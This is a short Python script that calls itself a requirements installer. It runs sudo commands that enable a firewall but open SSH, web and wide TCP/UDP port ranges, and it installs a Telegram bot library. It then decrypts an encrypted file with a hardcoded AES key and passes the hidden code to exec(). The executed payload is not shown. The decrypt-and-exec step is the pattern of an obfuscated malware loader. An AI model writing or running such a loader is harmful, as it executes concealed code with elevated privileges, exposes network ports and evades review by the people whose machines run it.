import os
import base64
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def install_requirements():
    os.system("sudo apt update")
    os.system("sudo apt install -y ufw python3-pip")
    os.system("sudo ufw enable")
    os.system("sudo ufw allow ssh")
    os.system("sudo ufw allow http")
    os.system("sudo ufw allow https")
    os.system("sudo ufw allow 10000:30000/udp")
    os.system("sudo ufw allow 10000:30000/tcp")
    os.system("sudo ufw status")
    os.system("pip install telebot pycryptodome")

install_requirements()

KEY = base64.b64decode("9ghy/QYLOvNz37MlR6uvaRGV7RU0oPTq5w1zZlyZXSc=")

def aes_decrypt(data, key):
    raw_data = base64.b64decode(data)
    iv, encrypted = raw_data[:16], raw_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted), AES.block_size).decode()

with open("megoxer.enc", "r", encoding="utf-8") as enc_file:
    encrypted_script = enc_file.read()

exec(aes_decrypt(encrypted_script, KEY))
